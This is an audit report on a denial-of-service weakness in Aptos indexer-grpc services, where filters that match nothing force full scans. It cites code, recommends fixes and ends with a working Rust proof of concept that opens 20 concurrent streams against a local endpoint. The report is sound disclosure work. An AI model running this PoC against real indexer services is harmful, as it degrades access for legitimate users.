# Audit Report

## Title
Indexer-gRPC Transaction Filter Resource Exhaustion via Non-Matching Filter Predicates

## Summary
The indexer-grpc services allow clients to submit transaction filters that pass size validation but match zero transactions. These filters cause the server to iterate through all transactions checking the filter predicate, consuming CPU and memory resources while returning empty results. An attacker can open multiple streams with such filters to cause service degradation for legitimate users.

## Finding Description
The `parse_transaction_filter()` function validates transaction filters only by checking their protobuf-encoded size against a configurable limit (default 10,000 bytes), but does not validate filter semantics or matching characteristics. [1](#0-0) 

The validation in `BooleanTransactionFilter::new_from_proto()` only enforces size constraints: [2](#0-1) 

In the fullnode streaming implementation, filters are applied AFTER expensive operations (storage fetch, API conversion, protobuf conversion): [3](#0-2) 

In the live data service, the filter is checked for every transaction sequentially in the cache: [4](#0-3) 

The loop continues incrementing through all transactions in the range, even when none match. In the historical service, the same pattern occurs: [5](#0-4) 

The ConnectionManager tracks active streams but enforces no resource limits per stream or per client: [6](#0-5) 

**Attack Path:**
1. Attacker crafts a syntactically valid filter that matches no transactions (e.g., `UserTransactionFilter` with `sender="0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF"`)
2. Opens multiple concurrent gRPC streams with this filter
3. Each stream consumes resources:
   - CPU time evaluating `filter.matches()` on every transaction
   - Memory accessing transactions from cache/storage
   - Lock contention on shared data structures (DataManager read locks)
4. Returns empty batches or minimal results, then requests next batch
5. Legitimate streams with no filter or simple filters experience degraded performance

## Impact Explanation
This vulnerability causes **service degradation** of the indexer-grpc infrastructure, affecting application availability. While it does not directly impact consensus or validator operations, the indexer service is critical infrastructure for dApps and users accessing blockchain data.

The impact fits **Medium severity** criteria as:
- Service degradation requires operator intervention to identify and block malicious streams
- Legitimate users experience slow or failed data retrieval
- Multiple concurrent malicious streams can effectively DoS the indexer service
- Unlike network-level DoS (excluded from scope), this is an application-level resource exhaustion exploit

This does not reach High severity because it does not crash validators or affect consensus safety.

## Likelihood Explanation
**Likelihood: High**

The attack requires only:
- Standard gRPC client access to the indexer service (publicly available)
- Ability to craft a simple filter (e.g., 50 bytes for a UserTransactionFilter with non-existent sender)
- No authentication beyond standard API access
- No special privileges or validator access

The default filter size limit (10KB) allows arbitrarily complex filters that can be crafted to match nothing while consuming maximum evaluation time.

## Recommendation

Implement multiple defense layers:

**1. Add empty result monitoring and throttling:**
```rust
// In InMemoryCache::get_data
const MAX_EMPTY_BATCHES_BEFORE_THROTTLE: usize = 10;

// Track consecutive empty batches per stream
let mut consecutive_empty_batches = 0;

// In the loop:
if result.is_empty() && version >= ending_version {
    consecutive_empty_batches += 1;
    if consecutive_empty_batches >= MAX_EMPTY_BATCHES_BEFORE_THROTTLE {
        // Introduce backpressure
        tokio::time::sleep(Duration::from_millis(100 * consecutive_empty_batches as u64)).await;
    }
} else if !result.is_empty() {
    consecutive_empty_batches = 0;
}
```

**2. Add per-client stream limits in ConnectionManager:**
```rust
const MAX_ACTIVE_STREAMS_PER_CLIENT: usize = 5;

pub(crate) fn insert_active_stream(
    &self,
    client_id: &str,  // Extract from request metadata
    id: &str,
    start_version: u64,
    end_version: Option<u64>,
) -> Result<(), Status> {
    let client_stream_count = self.active_streams
        .iter()
        .filter(|entry| entry.value().0.id.starts_with(client_id))
        .count();
    
    if client_stream_count >= MAX_ACTIVE_STREAMS_PER_CLIENT {
        return Err(Status::resource_exhausted("Too many concurrent streams"));
    }
    // ... existing code
}
```

**3. Add filter complexity scoring:**
```rust
impl BooleanTransactionFilter {
    pub fn complexity_score(&self) -> usize {
        match self {
            BooleanTransactionFilter::And(and) => {
                1 + and.and.iter().map(|f| f.complexity_score()).sum::<usize>()
            },
            BooleanTransactionFilter::Or(or) => {
                1 + or.or.iter().map(|f| f.complexity_score()).sum::<usize>()
            },
            BooleanTransactionFilter::Not(not) => 1 + not.not.complexity_score(),
            BooleanTransactionFilter::Filter(_) => 1,
        }
    }
}

// In parse_transaction_filter:
const MAX_FILTER_COMPLEXITY: usize = 50;
let filter = BooleanTransactionFilter::new_from_proto(proto_filter, max_filter_size)?;
if filter.complexity_score() > MAX_FILTER_COMPLEXITY {
    return Err(Status::invalid_argument("Filter too complex"));
}
```

## Proof of Concept

```rust
// Rust client demonstrating the attack
use aptos_protos::indexer::v1::{
    raw_data_client::RawDataClient,
    GetTransactionsRequest,
    BooleanTransactionFilter,
    boolean_transaction_filter::Filter,
    ApiFilter,
    api_filter::Filter as ApiFilterEnum,
    UserTransactionFilter,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = RawDataClient::connect("http://localhost:50051").await?;
    
    // Create filter that matches no transactions (non-existent sender)
    let filter = BooleanTransactionFilter {
        filter: Some(Filter::ApiFilter(ApiFilter {
            filter: Some(ApiFilterEnum::UserTransactionFilter(
                UserTransactionFilter {
                    sender: Some("0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF".to_string()),
                    payload_filter: None,
                }
            ))
        }))
    };
    
    // Open multiple streams concurrently
    let mut handles = vec![];
    for i in 0..20 {
        let mut client_clone = client.clone();
        let filter_clone = filter.clone();
        
        handles.push(tokio::spawn(async move {
            let request = Request::new(GetTransactionsRequest {
                starting_version: Some(0),
                transactions_count: None,
                batch_size: Some(1000),
                transaction_filter: Some(filter_clone),
            });
            
            let mut stream = client_clone.get_transactions(request).await.unwrap().into_inner();
            
            let mut batches = 0;
            while let Some(response) = stream.message().await.unwrap() {
                batches += 1;
                println!("Stream {} received batch {} with {} transactions", 
                    i, batches, response.transactions.len());
                
                if batches >= 100 {
                    break;
                }
            }
        }));
    }
    
    futures::future::join_all(handles).await;
    Ok(())
}
```

This PoC demonstrates opening 20 concurrent streams with filters matching no transactions, causing the server to process 20,000+ transaction batches while returning empty results, consuming CPU and degrading service for legitimate users.

## Notes

This vulnerability affects all three indexer-grpc service types:
- Fullnode indexer service [3](#0-2) 
- Live data service [4](#0-3) 
- Historical data service [5](#0-4) 

The default filter size limit of 10,000 bytes is insufficient protection as small filters (100 bytes) can still cause resource exhaustion. [7](#0-6)

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/filter_utils.rs (L9-15)
```rust
pub fn parse_transaction_filter(
    proto_filter: aptos_protos::indexer::v1::BooleanTransactionFilter,
    max_filter_size_bytes: usize,
) -> Result<BooleanTransactionFilter, Status> {
    BooleanTransactionFilter::new_from_proto(proto_filter, Some(max_filter_size_bytes))
        .map_err(|e| Status::invalid_argument(format!("Invalid transaction_filter: {e:?}.")))
}
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L98-107)
```rust
        if let Some(max_filter_size) = max_filter_size {
            ensure!(
                proto_filter.encoded_len() <= max_filter_size,
                format!(
                    "Filter is too complicated. Max size: {} bytes, Actual size: {} bytes",
                    max_filter_size,
                    proto_filter.encoded_len()
                )
            );
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L175-182)
```rust
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/in_memory_cache.rs (L88-94)
```rust
                if let Some(transaction) = data_manager.get_data(version).as_ref() {
                    // NOTE: We allow 1 more txn beyond the size limit here, for simplicity.
                    if filter.is_none() || filter.as_ref().unwrap().matches(transaction) {
                        total_bytes += transaction.encoded_len();
                        result.push(transaction.as_ref().clone());
                    }
                    version += 1;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator_v2/file_store_reader.rs (L140-142)
```rust
                if let Some(ref filter) = filter {
                    transactions.retain(|t| filter.matches(t));
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L190-215)
```rust
    pub(crate) fn insert_active_stream(
        &self,
        id: &str,
        start_version: u64,
        end_version: Option<u64>,
    ) {
        self.active_streams.insert(
            id.to_owned(),
            (
                ActiveStream {
                    id: id.to_owned(),
                    start_time: Some(timestamp_now_proto()),
                    start_version,
                    end_version,
                    progress: None,
                },
                StreamProgressSamples::new(),
            ),
        );
        let label = if self.is_live_data_service {
            ["live_data_service"]
        } else {
            ["historical_data_service"]
        };
        NUM_CONNECTED_STREAMS.with_label_values(&label).inc();
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L20-21)
```rust
// Default maximum size in bytes for transaction filters.
pub const DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES: usize = 10_000;
```
